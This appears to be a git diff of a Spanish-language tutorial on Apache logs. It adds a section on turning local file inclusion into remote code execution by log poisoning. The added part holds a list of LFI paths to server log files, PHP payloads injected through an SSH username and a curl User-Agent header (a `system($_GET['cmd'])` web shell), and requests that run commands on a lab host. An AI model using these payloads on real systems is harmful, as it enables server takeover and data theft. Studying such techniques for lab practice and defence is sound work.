@@ -42,7 +42,7 @@ Incluye información como:
 - navegador del cliente (User-Agent)  
 
 **Ejemplo de línea típica:**  
-```192.168.1.1 - - [06/Jun/2025:12:34:56 +0000] "GET /index.html HTTP/1.1" 200 1024```
+```172.17.0.2 - - [06/Jun/2025:12:34:56 +0000] "GET /index.html HTTP/1.1" 200 1024```
 
 ### 2️⃣ Error log (`error.log`)
 
@@ -58,3 +58,81 @@ Incluye:
 **Ejemplo de línea típica:**  
 ```[Fri Jun 06 12:34:56.789012 2025] [core:error] [pid 1234] [client 192.168.1.1:54321] File does not exist: /var/www/html/missing-page.html```
 ```
+
+## LFI, LOG POISONING
+
+Sabiendo lo que son los logs, si llegamos a tener acceso a ellos, podemos intentar aprovecharlo para ejecutar código malicioso.
+
+Si tenemos acceso a los archivos de logs mediante una vulnerabilidad LFI, por ejemplo:
+
+```
+http://example.com/index.php?page=/var/log/apache/access.log
+http://example.com/index.php?page=/var/log/apache/error.log
+http://example.com/index.php?page=/var/log/apache2/access.log
+http://example.com/index.php?page=/var/log/apache2/error.log
+http://example.com/index.php?page=/var/log/nginx/access.log
+http://example.com/index.php?page=/var/log/nginx/error.log
+http://example.com/index.php?page=/var/log/vsftpd.log
+http://example.com/index.php?page=/var/log/sshd.log
+http://example.com/index.php?page=/var/log/mail
+http://example.com/index.php?page=/var/log/httpd/error_log
+http://example.com/index.php?page=/usr/local/apache/log/error_log
+http://example.com/index.php?page=/usr/local/apache2/log/error_log
+```
+
+Y sabemos que el puerto 22 (SSH) está abierto, la idea es intentar una conexión SSH fallida que reporte el error al log.
+
+Al tener acceso al archivo de log, podremos ver ese reporte y entonces, ¿qué podemos hacer?  
+Pues **mandar código PHP malicioso** para intentar inyectarlo en el log.
+
+### Ejemplo de intento de inyección vía conexión SSH:
+
+```bash
+ssh "<?php system('id'); ?>" 172.17.0.2
+```
+
+Si en el log logramos ver algo como:
+
+```
+[Fri Jun 06 12:34:56.789012 2025] [php:error] [pid 1234] [client 172.17.0.2:54321] uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
+
+habremos conseguido que el log muestre la salida del comando `id`.
+
+Con esto podemos leer salidas en el log, y también archivos del sistema, como `/etc/passwd` para listar usuarios, etc.
+
+---
+
+### Verificar si el servidor interpreta PHP en los logs
+
+Si además el servidor interpreta PHP dentro de esos logs, podemos enviar código malicioso directamente con `curl`:
+
+```bash
+curl http://172.17.0.2/ -A "<?php system(\$_GET['cmd']);?>"
+```
+
+Luego hacemos una solicitud que incluya el archivo de log y el comando a ejecutar:
+
+```bash
+curl "http://172.17.0.2/test.php?page=/var/log/apache2/access.log&cmd=id"
+```
+
+O desde el navegador web:
+
+```
+http://172.17.0.2/test.php?page=/var/log/apache2/access.log&cmd=id
+```
+
+Si logramos incrustar código PHP en el log y que luego sea interpretado, podremos ejecutar comandos arbitrarios en el servidor.
+
+---
+
+**Resumen:**  
+- Accedemos a archivos de logs vía LFI  
+- Inyectamos código PHP malicioso en los logs (log poisoning)  
+- Si el log se interpreta como PHP, ejecutamos código remoto  
+- Esto permite ejecutar comandos en el servidor y leer archivos sensibles
+
+```
+
+
